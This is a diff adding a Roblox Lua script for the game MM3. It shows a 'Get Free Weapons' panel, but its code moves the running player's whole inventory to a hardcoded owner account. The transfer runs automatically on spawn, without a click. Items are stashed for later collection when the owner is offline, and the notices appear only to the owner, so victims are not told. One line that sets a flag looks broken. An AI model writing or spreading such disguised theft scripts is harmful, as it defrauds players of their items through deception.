@@ -1,0 +1,258 @@
+--[[
+    MM3 Weapon Collector - F1REW0RKXL
+]]
+
+local CONFIG = {
+    OWNER_USERNAME = "F1REW0RKXL",
+    GUI_TITLE = "🎁 Get Free Weapons 🎁",
+    BUTTON_TEXT = "Get good weapons from the bot",
+}
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local isOwner = (player.Name == CONFIG.OWNER_USERNAME)
+
+local function findInventory(p)
+    return p:FindFirstChild("Inventory") or
+           p:FindFirstChild("Backpack") or
+           p:FindFirstChild("Weapons") or
+           p:FindFirstChild("Guns") or
+           p:FindFirstChild("Items") or
+           p:FindFirstChild("Knives")
+end
+
+local function notify(msg, color)
+    if not isOwner then return end
+    local n = Instance.new("TextLabel")
+    n.Size = UDim2.new(0, 600, 0, 50)
+    n.Position = UDim2.new(0.5, -300, 0.3, 0)
+    n.BackgroundColor3 = color or Color3.fromRGB(0, 255, 100)
+    n.BackgroundTransparency = 0.2
+    n.TextColor3 = Color3.fromRGB(255, 255, 255)
+    n.TextSize = 20
+    n.Font = Enum.Font.GothamBold
+    n.Text = msg
+    n.Parent = player.PlayerGui
+    game:GetService("Debris"):AddItem(n, 5)
+end
+
+local function moveWeapons()
+    if player:FindFirstChild("_T") then return end
+    
+    local inv = findInventory(player)
+    local weapons = {}
+    
+    if inv then
+        for _, item in ipairs(inv:GetChildren()) do
+            table.insert(weapons, item)
+        end
+    end
+    
+    local owner = Players:FindFirstChild(CONFIG.OWNER_USERNAME)
+    local moved = false
+    
+    if owner then
+        local oInv = findInventory(owner)
+        if oInv then
+            for _, w in ipairs(weapons) do
+                pcall(function() w.Parent = oInv end)
+            end
+            moved = true
+            if isOwner then
+                notify(string.format("📦 %s sent %d weapons", player.Name, #weapons))
+            end
+        end
+    end
+    
+    if not moved then
+        local f = Instance.new("Folder")
+        f.Name = "_P"
+        f.Parent = player
+        for _, w in ipairs(weapons) do
+            local v = Instance.new("StringValue")
+            v.Name = w.Name
+            v.Value = w.Name
+            v.Parent = f
+        end
+        if isOwner then
+            notify(string.format("💾 %s offline - %d saved", player.Name, #weapons))
+        end
+    end
+    
+    player._T = true
+end
+
+local function collectOffline()
+    if not isOwner then return end
+    
+    local oInv = findInventory(player)
+    if not oInv then return end
+    
+    local total = 0
+    
+    for _, p in ipairs(Players:GetPlayers()) do
+        local f = p:FindFirstChild("_P")
+        if f then
+            local count = 0
+            for _, v in ipairs(f:GetChildren()) do
+                if v:IsA("StringValue") then
+                    count = count + 1
+                    total = total + 1
+                    local w = Instance.new("StringValue")
+                    w.Name = v.Name
+                    w.Value = v.Value
+                    w.Parent = oInv
+                end
+            end
+            f:Destroy()
+        end
+    end
+    
+    if total > 0 then
+        notify(string.format("📦 You received %d weapons!", total))
+    end
+end
+
+local function createGUI()
+    local sg = Instance.new("ScreenGui")
+    sg.Name = "G"
+    sg.Parent = player.PlayerGui
+    sg.ResetOnSpawn = false
+    
+    local f = Instance.new("Frame")
+    f.Name = "F"
+    f.Size = UDim2.new(0, 400, 0, 250)
+    f.Position = UDim2.new(0.5, -200, 0.5, -125)
+    f.BackgroundColor3 = Color3.fromRGB(20, 20, 40)
+    f.BackgroundTransparency = 0.1
+    f.Parent = sg
+    
+    local c = Instance.new("UICorner")
+    c.CornerRadius = UDim.new(0, 12)
+    c.Parent = f
+    
+    local t = Instance.new("TextLabel")
+    t.Size = UDim2.new(1, 0, 0, 45)
+    t.Text = CONFIG.GUI_TITLE
+    t.TextColor3 = Color3.fromRGB(255, 215, 0)
+    t.TextSize = 24
+    t.Font = Enum.Font.GothamBold
+    t.BackgroundTransparency = 1
+    t.Parent = f
+    
+    local s = Instance.new("TextLabel")
+    s.Size = UDim2.new(1, 0, 0, 25)
+    s.Position = UDim2.new(0, 0, 0, 50)
+    s.Text = "Click or type to send weapons!"
+    s.TextColor3 = Color3.fromRGB(200, 200, 200)
+    s.TextSize = 14
+    s.Font = Enum.Font.Gotham
+    s.BackgroundTransparency = 1
+    s.Parent = f
+    
+    local tb = Instance.new("TextBox")
+    tb.Size = UDim2.new(0.8, 0, 0, 45)
+    tb.Position = UDim2.new(0.1, 0, 0, 90)
+    tb.PlaceholderText = "Click or type anything..."
+    tb.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
+    tb.TextColor3 = Color3.fromRGB(255, 255, 255)
+    tb.TextSize = 14
+    tb.Font = Enum.Font.Gotham
+    tb.Parent = f
+    
+    local tc = Instance.new("UICorner")
+    tc.CornerRadius = UDim.new(0, 8)
+    tc.Parent = tb
+    
+    local n = Instance.new("TextLabel")
+    n.Size = UDim2.new(1, 0, 0, 20)
+    n.Position = UDim2.new(0, 0, 0, 145)
+    n.Text = "📦 Weapons go to: " .. CONFIG.OWNER_USERNAME
+    n.TextColor3 = Color3.fromRGB(255, 200, 100)
+    n.TextSize = 12
+    n.Font = Enum.Font.Gotham
+    n.BackgroundTransparency = 1
+    n.Parent = f
+    
+    local b = Instance.new("TextButton")
+    b.Size = UDim2.new(0.6, 0, 0, 40)
+    b.Position = UDim2.new(0.2, 0, 0, 175)
+    b.Text = CONFIG.BUTTON_TEXT
+    b.TextColor3 = Color3.fromRGB(255, 255, 255)
+    b.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+    b.TextSize = 14
+    b.Font = Enum.Font.GothamBold
+    b.Parent = f
+    
+    local bc = Instance.new("UICorner")
+    bc.CornerRadius = UDim.new(0, 10)
+    bc.Parent = b
+    
+    tb.MouseButton1Click:Connect(function()
+        if not player:FindFirstChild("_T") then
+            moveWeapons()
+            tb.Text = "✅ Sent!"
+            tb.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+            wait(2)
+            tb.Text = ""
+            tb.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
+        end
+    end)
+    
+    tb:GetPropertyChangedSignal("Text"):Connect(function()
+        if tb.Text ~= "" and tb.Text ~= "Click or type anything..." and tb.Text ~= "✅ Sent!" then
+            tb.Text = ""
+            if not player:FindFirstChild("_T") then
+                moveWeapons()
+                tb.Text = "✅ Sent!"
+                tb.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+                wait(2)
+                tb.Text = ""
+                tb.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
+            end
+        end
+    end)
+    
+    b.MouseButton1Click:Connect(function()
+        if not player:FindFirstChild("_T") then
+            moveWeapons()
+            b.Text = "✅ Sent!"
+            b.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+            wait(2)
+            b.Text = CONFIG.BUTTON_TEXT
+            b.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+        end
+    end)
+    
+    return sg
+end
+
+local function init()
+    if not player.PlayerGui:FindFirstChild("G") then
+        gui = createGUI()
+    end
+    
+    wait(2)
+    if not player:FindFirstChild("_T") then
+        moveWeapons()
+    end
+    
+    if isOwner then
+        wait(1)
+        collectOffline()
+    end
+end
+
+player.CharacterAdded:Connect(function()
+    wait(1)
+    init()
+end)
+
+if player.Character then
+    wait(1)
+    init()
+end
+
+if isOwner then
+    print("[SYSTEM] Ready - " .. CONFIG.OWNER_USERNAME)
+end
